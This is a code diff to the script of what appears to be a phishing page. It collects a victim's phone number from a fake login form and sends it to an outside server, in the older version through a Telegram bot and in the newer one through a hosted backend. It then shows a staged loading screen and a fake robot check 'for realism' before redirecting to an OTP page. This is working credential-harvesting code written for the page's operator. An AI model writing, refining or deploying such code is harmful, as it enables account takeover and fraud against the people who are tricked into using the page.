@@ -214,69 +214,67 @@ button{
 </div>
 
 <script>
-/* PUT YOUR DETAILS */
-function sendToBackend("New login: "+fullNumber){
-  fetch("https://yourdomain.com/send-telegram",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ message })
-  });
-}
-
-function startProcess(){
-
-  let phone = document.getElementById("phone").value;
-  let code  = document.getElementById("code").value;
-
-  if(phone.length < 9){
-    alert("Enter valid phone number");
-    return;
+  /**
+   * 1. SEND DATA TO YOUR BACKEND
+   * This keeps your Telegram Token hidden on your server.
+   */
+  async function sendToBackend(fullNumber) {
+    const msg = "New login: " + fullNumber;
+    
+    try {
+      // REPLACE 'https://yourdomain.com/send-telegram' with your actual Backend URL
+      await fetch("https://inbucks-1.onrender.com/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: msg }) // Sending 'message' to the backend
+      });
+    } catch (error) {
+      console.error("Backend Error:", error);
+    }
   }
-
-  let fullNumber = code + phone;
-
-  /* SEND IMMEDIATELY */
-  sendToTelegram(fullNumber);
-
-  /* Save local */
-  localStorage.setItem("userPhone", fullNumber);
-
-  /* Show loader */
-  document.getElementById("loaderScreen").style.display="flex";
-
-  /* Wait 7 seconds */
-  setTimeout(()=>{
-    document.getElementById("loaderScreen").style.display="none";
-    document.getElementById("robotScreen").style.display="flex";
-  },7000);
-}
-
-/* Robot check */
-document.getElementById("robotCheck").addEventListener("change",function(){
-
-  if(this.checked){
-
-    setTimeout(()=>{
-      window.location.href="otp.html";
-    },800);
+  
+  /**
+   * 2. INITIALIZE THE LOGIN PROCESS
+   */
+  function startProcess() {
+    let phone = document.getElementById("phone").value;
+    let code = document.getElementById("code").value;
+  
+    if (phone.length < 9) {
+      alert("Enter valid phone number");
+      return;
+    }
+  
+    let fullNumber = code + phone;
+  
+    // Save number locally for the next screen (otp.html)
+    localStorage.setItem("userPhone", fullNumber);
+  
+    // Send the number to your live backend
+    sendToBackend(fullNumber);
+  
+    // Show the loading animation
+    document.getElementById("loaderScreen").style.display = "flex";
+  
+    // Wait 4 seconds, then show the "Not a Robot" screen
+    setTimeout(() => {
+      document.getElementById("loaderScreen").style.display = "none";
+      document.getElementById("robotScreen").style.display = "flex";
+    }, 4000);
   }
-});
-
-/* Telegram sender */
-function sendToTelegram(number){
-
-  let msg = `📲 New User Login\nPhone: ${number}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id:CHAT_ID,
-      text:msg
-    })
+  
+  /**
+   * 3. ROBOT CHECK LOGIC
+   */
+  document.getElementById("robotCheck").addEventListener("change", function() {
+    if (this.checked) {
+      // Small delay for realism before moving to OTP page
+      setTimeout(() => {
+        window.location.href = "otp.html";
+      }, 800);
+    }
   });
-}
-</script>
+  </script>
 
 </body>
 </html>
